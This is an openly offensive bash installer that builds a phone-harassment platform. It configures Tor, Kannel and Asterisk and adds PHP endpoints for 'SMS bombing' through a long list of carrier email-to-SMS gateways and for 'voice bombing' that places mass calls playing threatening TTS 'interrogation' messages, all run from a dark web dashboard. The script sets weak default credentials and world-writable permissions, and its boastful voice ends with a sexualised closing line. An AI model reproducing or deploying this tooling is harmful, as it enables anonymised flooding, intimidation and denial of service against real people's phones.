#!/bin/bash
# =============================================================================
# SleepTheGod's GODMODE CARRIER ANNIHILATION & INTERROGATION PLATFORM 2026
# SMS bombing (NDB style) + Voice bombing (TTS interrogation) + Tor + DLR trolling
# Evesdrop logs + dark dashboard + glowie bait + browser beeps + full provider list
# root/root Asterisk + Kannel + everything combined - no survivors
# Run & ascend to eternal watch-list legend 😈🖤
# =============================================================================

set -e

RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' NC='\033[0m'

SIP_USER="root"
SIP_PASS="root"
SIP_SRV="sip.verizonbusiness.com"
SIP_PORT="5060"
WEB_PASS="admin123"
DB_PASS="smsc123"
SERVER_IP=$(hostname -I | awk '{print $1}')

log() { echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"; }
err() { echo -e "${RED}[ERROR] $1${NC}"; exit 1; }

[[ $EUID -eq 0 ]] || err "sudo me daddy"
grep -q bookworm /etc/os-release || err "Debian 12 Bookworm only"

apt-get update && apt-get upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" || true

apt-get install -y wget curl gnupg2 build-essential libssl-dev libncurses5-dev libxml2-dev \
    linux-headers-$(uname -r) libsqlite3-dev uuid-dev git ffmpeg sox mpg123 sqlite3 \
    apache2 php php-mysql php-curl php-json php-gd php-mbstring php-xml php-zip \
    mariadb-server mariadb-client libmariadb-dev libjansson-dev libedit-dev tor torsocks \
    espeak-ng || true

# ─── Tor ────────────────────────────────────────────────────────────────────────
systemctl enable --now tor
cat > /etc/tor/torrc << 'EOF'
SocksPort 9050
ControlPort 9051
CookieAuthentication 1
EOF
systemctl restart tor

# ─── Kannel 1.4.5 ───────────────────────────────────────────────────────────────
cd /usr/src
rm -rf gateway-*
wget -qO gateway.tar.gz https://github.com/kannel/gateway/archive/refs/tags/1.4.5.tar.gz
tar xzf gateway.tar.gz && cd gateway-1.4.5
./configure --with-mysql --with-ssl --disable-wap && make -j$(nproc) && make install

mkdir -p /etc/kannel /var/{log,spool,run}/kannel
chmod 777 /var/run/kannel

cat > /etc/kannel/kannel.conf << 'EOF'
group = core
admin-port = 13000
admin-password = admin123
status-password = admin123
log-file = "/var/log/kannel/kannel.log"
log-level = 0
store-file = "/var/spool/kannel/store"

group = smsc
smsc = smpp
smsc-id = sip-smsc
host = localhost
port = 2775
smsc-username = kannel
smsc-password = smsc123

group = sms-gateway
smsbox-port = 13001
bearerbox-host = localhost

group = smsbox
bearerbox-host = localhost
sendsms-port = 13013

group = sendsms-user
username = smsuser
password = smsc123

group = mysql-connection
id = mydb
host = localhost
username = kannel
password = smsc123
database = smsgw

group = sqlbox
id = sqlbox
connection-id = mydb
insert-log-table = sent_sms
EOF

# ─── Asterisk 20 ────────────────────────────────────────────────────────────────
cd /usr/src
rm -rf asterisk-*
wget -q https://downloads.asterisk.org/pub/telephony/asterisk/asterisk-20-current.tar.gz
tar xzf asterisk-20-current.tar.gz && cd asterisk-20.*
contrib/scripts/get_mp3_source.sh
./configure --with-jansson-bundled && make -j$(nproc) && make install && make config && make samples

groupadd asterisk 2>/dev/null || true
useradd -r -d /var/lib/asterisk -g asterisk asterisk 2>/dev/null || true
usermod -aG audio,dialout asterisk
chown -R asterisk:asterisk /etc/asterisk /var/{lib,log,spool}/asterisk /usr/lib/asterisk

cat > /etc/asterisk/pjsip.conf << EOF
[transport-udp]
type=transport
protocol=udp
bind=0.0.0.0:5060

[root-auth]
type=auth
auth_type=userpass
password=$SIP_PASS
username=$SIP_USER
realm=$SIP_SRV

[root-endpoint]
type=endpoint
transport=transport-udp
context=from-trunk
disallow=all
allow=ulaw,alaw
auth=root-auth
aors=root-aor

[root-aor]
type=aor
max_contacts=1

[root-reg]
type=registration
transport=transport-udp
server_uri=sip:$SIP_SRV:5060
client_uri=sip:$SIP_USER@$SIP_SRV:5060
auth_realm=$SIP_SRV
EOF

cat > /etc/asterisk/manager.conf << EOF
[general]
enabled=yes
port=5038
bindaddr=0.0.0.0

[admin]
secret=$WEB_PASS
read=all
write=all
EOF

# ─── TTS interrogation helper ───────────────────────────────────────────────────
cat > /usr/local/bin/tts-interrogate.sh << 'EOF'
#!/bin/bash
text="$1"
number="$2"
/usr/bin/espeak -w /tmp/pwn.wav "$text" 2>/dev/null
sox /tmp/pwn.wav -r 8000 -c 1 -t gsm /tmp/pwn.gsm 2>/dev/null
torsocks asterisk -rx "channel originate SIP/$number application Playback /tmp/pwn" >/dev/null 2>&1 &
rm -f /tmp/pwn.*
EOF
chmod +x /usr/local/bin/tts-interrogate.sh

# ─── MariaDB & tables ───────────────────────────────────────────────────────────
systemctl enable --now mariadb
mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '$DB_PASS';FLUSH PRIVILEGES;" 2>/dev/null || true

for db in smsgw phonelogs; do
  mysql -u root -p"$DB_PASS" -e "CREATE DATABASE IF NOT EXISTS $db;"
done

mysql -u root -p"$DB_PASS" -e "CREATE USER IF NOT EXISTS 'kannel'@'localhost' IDENTIFIED BY '$DB_PASS'; GRANT ALL ON smsgw.* TO 'kannel'@'localhost'; GRANT ALL ON phonelogs.* TO 'kannel'@'localhost';"

mysql -u root -p"$DB_PASS" smsgw << 'EOF'
CREATE TABLE IF NOT EXISTS sent_sms (
    id INT AUTO_INCREMENT PRIMARY KEY,
    source VARCHAR(50),
    destination VARCHAR(50),
    message TEXT,
    status VARCHAR(50),
    sent_time DATETIME DEFAULT CURRENT_TIMESTAMP
);
EOF

mysql -u root -p"$DB_PASS" phonelogs << 'EOF'
CREATE TABLE IF NOT EXISTS call_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    target VARCHAR(50),
    channel_count INT,
    start_time DATETIME DEFAULT CURRENT_TIMESTAMP,
    interrogation_text TEXT
);

CREATE TABLE IF NOT EXISTS system_alerts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    alert_time DATETIME DEFAULT CURRENT_TIMESTAMP,
    alert_type VARCHAR(50),
    message TEXT,
    severity ENUM('info','warning','critical') DEFAULT 'info',
    acknowledged TINYINT DEFAULT 0
);
EOF

# ─── Web Interface ──────────────────────────────────────────────────────────────
mkdir -p /var/www/html/phone/{api,assets/{js,css}}
chown -R www-data:www-data /var/www/html/phone
chmod -R 755 /var/www/html/phone
chmod -R 777 /var/www/html/phone

cat > /var/www/html/phone/api/config.php << EOF
<?php
define('DB_HOST','localhost');
define('DB_USER','kannel');
define('DB_PASS','$DB_PASS');
define('DB_SMS','smsgw');
define('DB_LOGS','phonelogs');
define('KANNEL_USER','smsuser');
define('KANNEL_PASS','$DB_PASS');
?>
EOF

# SMS bomb - full NDB provider list + Tor
cat > /var/www/html/phone/api/sms-bomb.php << 'EOF'
<?php
header('Content-Type: application/json');
require 'config.php';
$data = json_decode(file_get_contents('php://input'), true) ?: $_POST;
$number   = trim($data['number']   ?? '');
$provider = trim($data['provider'] ?? '');
$shots    = (int)($data['shots']    ?? 100);
$sender   = trim($data['sender']   ?? 'SleepTheGod');
$msg      = trim($data['msg']      ?? 'YOU HAVE BEEN PWNED BY SleepTheGod');
if (!$number || !$provider || $shots < 1) exit(json_encode(['success'=>false]));
$to = $number . $provider;
$ok = 0;
$db = new PDO("mysql:host=".DB_HOST.";dbname=".DB_SMS, DB_USER, DB_PASS);
for ($i = 0; $i < $shots; $i++) {
    $url = "http://localhost:13013/cgi-bin/sendsms";
    $post = [
        'username'  => KANNEL_USER,
        'password'  => KANNEL_PASS,
        'to'        => $to,
        'from'      => $sender,
        'text'      => $msg,
        'dlr-mask'  => '31',
        'dlr-url'   => 'http://127.0.0.1/phone/api/dlr-pwn.php?mid=%d&to=%p&status=%A'
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST       => true,
        CURLOPT_POSTFIELDS => http_build_query($post),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_PROXY      => 'socks5h://127.0.0.1:9050',
        CURLOPT_TIMEOUT    => 15
    ]);
    $resp = curl_exec($ch);
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 202) $ok++;
    curl_close($ch);
    usleep(50000);
}
echo json_encode(['success'=>true, 'sent'=>$ok, 'total'=>$shots]);
?>
EOF

# Voice bomb + TTS interrogation
cat > /var/www/html/phone/api/voice-bomb.php << 'EOF'
<?php
header('Content-Type: application/json');
require 'config.php';
$data = json_decode(file_get_contents('php://input'), true) ?: $_POST;
$number = trim($data['number'] ?? '');
$shots  = (int)($data['shots']  ?? 50);
$interrogate = trim($data['interrogate'] ?? 'You are being interrogated by SleepTheGod. Who sent you? Speak now or suffer eternal torment.');
if (!$number || $shots < 1) exit(json_encode(['success'=>false]));
$ok = 0;
$db = new PDO("mysql:host=".DB_HOST.";dbname=".DB_LOGS, DB_USER, DB_PASS);
for ($i = 0; $i < $shots; $i++) {
    $cmd = "torsocks asterisk -rx \"channel originate SIP/$number application Playback silence/1\" >/dev/null 2>&1 &";
    exec($cmd, $out, $ret);
    if ($ret === 0) {
        $ok++;
        sleep(1);
        $tts_cmd = "torsocks /usr/local/bin/tts-interrogate.sh " . escapeshellarg($interrogate) . " $number";
        exec($tts_cmd);
    }
    usleep(300000);
}
$db->prepare("INSERT INTO call_logs (target, channel_count, interrogation_text) VALUES (?, ?, ?)")->execute([$number, $ok, $interrogate]);
echo json_encode(['success'=>true, 'calls'=>$ok, 'total'=>$shots]);
?>
EOF

# DLR callback - glowie magnet
cat > /var/www/html/phone/api/dlr-pwn.php << 'EOF'
<?php
require 'config.php';
$mid   = $_GET['mid']   ?? '???';
$to    = $_GET['to']    ?? '???';
$status = $_GET['status'] ?? 'unknown';
$db = new PDO("mysql:host=".DB_HOST.";dbname=".DB_LOGS, DB_USER, DB_PASS);
$db->prepare("INSERT INTO system_alerts (alert_type, message, severity) VALUES ('PWN_DLR', 'SLEEP THE GOD PWNED CARRIER – MID:$mid TO:$to STATUS:$status – GLOWIES CRYING', 'critical')")->execute();
echo "666 - SLEEP THE GOD WAS HERE - $status $mid $to\n";
?>
EOF

# Full NDB-style dashboard + voice + sms + feed
cat > /var/www/html/phone/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
<meta charset="UTF-8">
<title>SleepTheGod's Total Pwn 2026</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<style>
body{background:#000;color:#0f0}.sidebar{background:#111;height:100vh}.nav-link{color:#0f0}
.nav-link.active{background:#222}.card{background:#111;border:1px solid #0f0}
.btn-danger{background:#900}
</style>
</head>
<body class="d-flex">
  <div class="sidebar col-2 p-3">
    <h4 class="text-danger text-center">SleepTheGod</h4>
    <nav class="nav flex-column">
      <a class="nav-link active" href="#" data-page="bomb">TOTAL PWN</a>
    </nav>
  </div>
  <div class="col-10 p-4" id="main"></div>

  <script>
  const beep = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-retro-game-over-213.mp3');
  function load() {
    $('#main').html(`
      <h2 class="text-danger"><i class="bi bi-skull-fill"></i> SleepTheGod's Total Annihilation Platform</h2>
      <div class="row g-4">
        <div class="col-md-6">
          <div class="card p-4">
            <h4>SMS BOMB (NDB Style)</h4>
            <form id="smsForm">
              <div class="mb-3"><label>Shots</label><input type="number" class="form-control bg-dark text-success" name="shots" value="666" min="1" max="9999"></div>
              <div class="mb-3"><label>Number (10 digits)</label><input type="text" class="form-control bg-dark text-success" name="number" pattern="[0-9]{10}" required></div>
              <div class="mb-3"><label>Provider Gateway</label><select class="form-select bg-dark text-success" name="provider" required>
                <option value="@sms.3rivers.net">3 River Wireless</option>
                <option value="@paging.acswireless.com">ACS Wireless</option>
                <option value="@message.alltel.com">Alltel</option>
                <option value="@txt.att.net">AT&T</option>
                <option value="@txt.bellmobility.ca">Bell Canada</option>
                <option value="@bellmobility.ca">Bell Canada</option>
                <option value="@txt.bell.ca">Bell Mobility (Canada)</option>
                <option value="@txt.bellmobility.ca">Bell Mobility</option>
                <option value="@blueskyfrog.com">Blue Sky Frog</option>
                <option value="@sms.bluecell.com">Bluegrass Cellular</option>
                <option value="@myboostmobile.com">Boost Mobile</option>
                <option value="@bplmobile.com">BPL Mobile</option>
                <option value="@cwwsms.com">Carolina West Wireless</option>
                <option value="@mobile.celloneusa.com">Cellular One</option>
                <option value="@csouth1.com">Cellular South</option>
                <option value="@cwemail.com">Centennial Wireless</option>
                <option value="@messaging.centurytel.net">CenturyTel</option>
                <option value="@txt.att.net">Cingular (Now AT&T)</option>
                <option value="@msg.clearnet.com">Clearnet</option>
                <option value="@comcastpcs.textmsg.com">Comcast</option>
                <option value="@corrwireless.net">Corr Wireless Communications</option>
                <option value="@mobile.dobson.net">Dobson</option>
                <option value="@sms.edgewireless.com">Edge Wireless</option>
                <option value="@fido.ca">Fido</option>
                <option value="@sms.goldentele.com">Golden Telecom</option>
                <option value="@txt.voice.google.com">Google Voice</option>
                <option value="@messaging.sprintpcs.com">Helio</option>
                <option value="@text.houstoncellular.net">Houston Cellular</option>
                <option value="@ideacellular.net">Idea Cellular</option>
                <option value="@ivctext.com">Illinois Valley Cellular</option>
                <option value="@inlandlink.com">Inland Cellular Telephone</option>
                <option value="@pagemci.com">MCI</option>
                <option value="@page.metrocall.com">Metrocall</option>
                <option value="@my2way.com">Metrocall 2-way</option>
                <option value="@mymetropcs.com">Metro PCS</option>
                <option value="@fido.ca">Microcell</option>
                <option value="@clearlydigital.com">Midwest Wireless</option>
                <option value="@mobilecomm.net">Mobilcomm</option>
                <option value="@text.mtsmobility.com">MTS</option>
                <option value="@messaging.nextel.com">Nextel</option>
                <option value="@onlinebeep.net">OnlineBeep</option>
                <option value="@pcsone.net">PCS One</option>
                <option value="@txt.bell.ca">Presidents Choice</option>
                <option value="@sms.pscel.com">Public Service Cellular</option>
                <option value="@qwestmp.com">Qwest</option>
                <option value="@pcs.rogers.com">Rogers AT&T Wireless</option>
                <option value="@pcs.rogers.com">Rogers Canada</option>
                <option value="@pageme@satellink.net">Satellink</option>
                <option value="@email.swbw.com">Southwestern Bell</option>
                <option value="@messaging.sprintpcs.com">Sprint</option>
                <option value="@tms.suncom.com">Sumcom</option>
                <option value="@mobile.surewest.com">Surewest Communicaitons</option>
                <option value="@tmomail.net">T-Mobile</option>
                <option value="@msg.telus.com">Telus</option>
                <option value="@txt.att.net">Tracfone</option>
                <option value="@tms.suncom.com">Triton</option>
                <option value="@utext.com">Unicel</option>
                <option value="@email.uscc.net">US Cellular</option>
                <option value="@txt.bell.ca">Solo Mobile</option>
                <option value="@uswestdatamail.com">US West</option>
                <option value="@vtext.com">Verizon</option>
                <option value="@vmobl.com">Virgin Mobile</option>
                <option value="@vmobile.ca">Virgin Mobile Canada</option>
                <option value="@sms.wcc.net">West Central Wireless</option>
                <option value="@cellularonewest.com">Western Wireless</option>
              </select></div>
              <div class="mb-3"><label>Message</label><textarea class="form-control bg-dark text-success" name="msg" rows="3" required>PWNED BY SleepTheGod</textarea></div>
              <button type="submit" class="btn btn-danger w-100">LAUNCH SMS BOMB 💣</button>
            </form>
            <div id="smsResult" class="mt-3"></div>
          </div>
        </div>
        <div class="col-md-6">
          <div class="card p-4">
            <h4>VOICE INTERROGATION BOMB</h4>
            <form id="voiceForm">
              <div class="mb-3"><label>Calls</label><input type="number" class="form-control bg-dark text-success" name="shots" value="200" min="1" max="2000"></div>
              <div class="mb-3"><label>Target Number</label><input type="text" class="form-control bg-dark text-success" name="number" required></div>
              <div class="mb-3"><label>Interrogation TTS</label><textarea class="form-control bg-dark text-success" name="interrogate" rows="3" required>You are being interrogated by SleepTheGod. Who sent you? Speak now or suffer eternal torment.</textarea></div>
              <button type="submit" class="btn btn-danger w-100">LAUNCH VOICE BOMB ☎️💀</button>
            </form>
            <div id="voiceResult" class="mt-3"></div>
          </div>
        </div>
      </div>
      <div class="mt-5">
        <h4 class="text-danger">Live Glowie Tears & Evesdrop Feed</h4>
        <div id="feed" class="list-group" style="max-height:500px;overflow-y:auto;background:#000;border:1px solid #0f0"></div>
      </div>
    `);

    $('#smsForm').submit(e => {
      e.preventDefault();
      const fd = new FormData(e.target);
      fetch('api/sms-bomb.php', {method:'POST', body:fd})
        .then(r=>r.json()).then(d=>{
          $('#smsResult').html(d.success?`<div class="alert alert-success">Sent ${d.sent}/${d.total} via Tor</div>`:`<div class="alert alert-danger">Fail</div>`);
          beep.play().catch(()=>{});
        });
    });

    $('#voiceForm').submit(e => {
      e.preventDefault();
      const fd = new FormData(e.target);
      fetch('api/voice-bomb.php', {method:'POST', body:fd})
        .then(r=>r.json()).then(d=>{
          $('#voiceResult').html(d.success?`<div class="alert alert-success">${d.calls} interrogations sent via Tor</div>`:`<div class="alert alert-danger">Voice bomb failed</div>`);
          beep.play().catch(()=>{});
        });
    });

    setInterval(()=>{
      fetch('api/alerts.php').then(r=>r.json()).then(d=>{
        let html='';
        d.forEach(a=>{
          if(a.severity==='critical'){
            html+=`<div class="list-group-item list-group-item-danger">${a.alert_time} - ${a.message}</div>`;
          }
        });
        if(html) $('#feed').prepend(html);
      });
    },3000);
  }
  load();
  </script>
</body>
</html>
EOF

cat > /var/www/html/phone/api/alerts.php << 'EOF'
<?php
header('Content-Type: application/json');
require 'config.php';
$db=new PDO("mysql:host=".DB_HOST.";dbname=".DB_LOGS,DB_USER,DB_PASS);
$stmt=$db->query("SELECT * FROM system_alerts WHERE severity='critical' ORDER BY alert_time DESC LIMIT 50");
echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
?>
EOF

# Services
a2enmod rewrite proxy proxy_http
cat > /etc/apache2/sites-available/phone.conf << EOF
<VirtualHost *:80>
    DocumentRoot /var/www/html/phone
    <Directory /var/www/html/phone>
        Options +Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
EOF
a2ensite phone.conf
a2dissite 000-default.conf

cat > /etc/systemd/system/kannel.service << EOF
[Unit]
Description=SleepTheGod Kannel Pwn
After=network.target mariadb.service tor.service
[Service]
Type=forking
ExecStart=/usr/local/sbin/bearerbox /etc/kannel/kannel.conf
ExecStartPost=/usr/local/sbin/smsbox /etc/kannel/kannel.conf
Restart=always
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now mariadb apache2 asterisk tor kannel

ufw allow 80/tcp 5060/udp 5038/tcp 13000:13013/tcp 9050 || true

echo -e "\n${RED}SleepTheGod's GODMODE PWN PLATFORM IS LIVE${NC}"
echo "http://$SERVER_IP/phone"
echo "Tor SOCKS: 127.0.0.1:9050"
echo "SMS bombing (full NDB list) + Voice TTS interrogation + DLR trolling + evesdrop logs ready"
echo "Fire it up and make history daddy 🖤💀"
echo "waifu is wet just thinking about the chaos you're about to unleash 😈"
